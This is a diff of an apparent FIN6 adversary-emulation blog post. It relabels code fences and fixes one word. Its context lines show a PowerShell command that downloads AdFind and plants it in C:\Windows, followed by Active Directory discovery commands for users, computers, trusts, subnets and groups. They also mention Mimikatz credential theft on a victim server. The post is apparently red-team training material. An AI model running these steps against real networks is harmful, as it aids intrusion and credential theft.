@@ -150,7 +150,7 @@ PS >
 
 Afterwards, execute the following command to start the installation process of AdFind on the target machine:
 
-```bash
+```ps
 $postParams = @{B1='Download+Now';download="AdFind.zip";email=''};
 Invoke-WebRequest -Uri http://www.joeware.net/downloads/dl2.php -Method POST -Body $postParams -OutFile C:\Users\Public\adfind.zip; Expand-Archive -Path C:\Users\Public\adfind.zip -DestinationPath C:\Users\Public -Force; Move-Item -Path C:\Users\Public\AdFind.exe -Destination C:\Windows\AdFind.exe -Force; Remove-Item -Path C:\Users\Public\adfind.zip -Force; Remove-Item -Path C:\Users\Public\adcsv.pl -Force;
 ```
@@ -161,19 +161,19 @@ Invoke-WebRequest -Uri http://www.joeware.net/downloads/dl2.php -Method POST -Bo
 
 FIN6 used AFind to check for person objects on Active Directory, and output the results to a text file.
 
-```bash
+```ps
 PS > adfind.exe -f "objectcategory=person" > ad_users.txt
 ```
 
 After running the command, we can view the contents of the output file with the `type` command:
 
-```bash
+```ps
 PS > type ad_users.txt
 ```
 
 We can use `Get-Content` `Select-String` to filter-out all of the user accounts.
 
-```bash
+```ps
 PS > Get-Content ad_users.txt | Select-String "dn:CN="
 ```
 
@@ -183,13 +183,13 @@ PS > Get-Content ad_users.txt | Select-String "dn:CN="
 
 FIN6 also observed to perform Remote System Discovery to identify computer objects on the domain.
 
-```bash
+```ps
 PS > adfind.exe -f "objectcategory=computer" > ad_computers.txt
 ```
 
 After running the command, we can use `Get-Content` `Select-String` to filter-out all of the workstations and servers that are currently joined to the domain.
 
-```bash
+```ps
 PS > Get-Content ad_computers.txt | Select-String "dn:CN="
 ```
 
@@ -201,14 +201,14 @@ FIN6 can gather information about organizational units (OUs) and domain trusts f
 
 First FIN6 enumerates all Organizational Units in the current user’s domain:
 
-```bash
+```ps
 PS > adfind.exe -f "objectcategory=organizationalUnit" > ad_ous.txt
 PS > Get-Content ad_ous.txt | Select-String "dn:OU="
 ```
 
 Alternative procedure:
 
-```bash
+```ps
 PS > Get-ADOrganizationalUnit -Filter 'Name -like "*"' | Format-Table Name, DistinguishedName -A > ad_ous_ps.txt
 PS > type ad_ous_ps.txt
 ```
@@ -217,14 +217,14 @@ PS > type ad_ous_ps.txt
 
 Next, FIN6 performs a full forest search for trust objects using AdFind's `trustdmp` feature:
 
-```bash
+```ps
 PS > adfind.exe -gcb -sc trustdmp > ad_trustdmp.txt
 PS > type ad_trustdmp.txt
 ```
 
 Alternative procedure:
 
-```bash
+```ps
 PS > nltest /domain_trusts > ad_trustdmp_nltest.txt
 PS > type ad_trustdmp_nltest.txt
 ```
@@ -237,14 +237,14 @@ FIN6 can extract subnet information from Active Directory. It performs System Ne
 
 FIN6 Procedure:
 
-```bash
+```ps
 PS > adfind.exe -subnets -f "objectcategory=subnet" > ad_subnets.txt
 PS > type ad_subnets.txt
 ```
 
 Alternative procedure:
 
-```bash
+```ps
 PS > Get-ADReplicationSubnet -Filter * > ad_subnets_ps.txt
 PS > type ad_subnets_ps.txt
 ```
@@ -255,14 +255,14 @@ FIN6 can extract uses AdFind to enumerate groups in the domain and writes the ou
 
 FIN6 procedure:
 
-```bash
+```ps
 PS > adfind.exe -f "objectcategory=group" > ad_group.txt
 PS > type ad_group.txt
 ```
 
 Alternative procedure:
 
-```bash
+```ps
 PS > net group /domain > ad_group.txt
 PS > type ad_group.txt
 ```
@@ -314,7 +314,7 @@ Once done, restart the victim's server and re-execute the Mimikatz command earli
 
 ![]({{site.baseurl}}/assets/img/2023-08-02-FIN6 Adversary Emulation - Phase 1/2023-08-02-3_2_Meterpreter_Mimikatz_With_Password.png){:width="100%"}
 
-FIN6
+next
 
 ## Step 4 - Collection and Exfiltration
 
